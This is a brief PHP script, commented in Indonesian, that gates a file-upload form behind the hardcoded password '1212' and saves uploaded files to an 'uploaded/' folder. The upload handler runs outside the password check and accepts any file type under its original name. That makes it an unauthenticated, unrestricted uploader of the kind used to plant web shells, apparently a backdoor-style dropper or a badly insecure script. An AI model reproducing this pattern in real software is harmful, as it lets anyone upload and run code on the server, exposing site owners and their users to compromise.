<?php
if(isset($_POST['pass'])){
  if($_POST['pass']=== '1212'){ ?>
    <form action='' method='POST' enctype='multipart/form-data'>
      <input type='file' name='source'><br>
      <input type='submit' name='go' value='go'>
    </form> <?php
  } 
}else{ ?>
  <form action='' method='POST' enctype='multipart/form-data'>
    <input type='password' name='pass'><br>
    <input type='submit' name='go' value='go'>
  </form> <?php
} 
if (isset($_FILES['source']['name'])) {
  $target_Path = "uploaded/";
  $target_Path = $target_Path.basename( $_FILES['source']['name'] );
  move_uploaded_file( $_FILES['source']['tmp_name'], $target_Path );
}

echo "<br><br> source recheck ";

//untuk upload file ke folder uploaded
?>



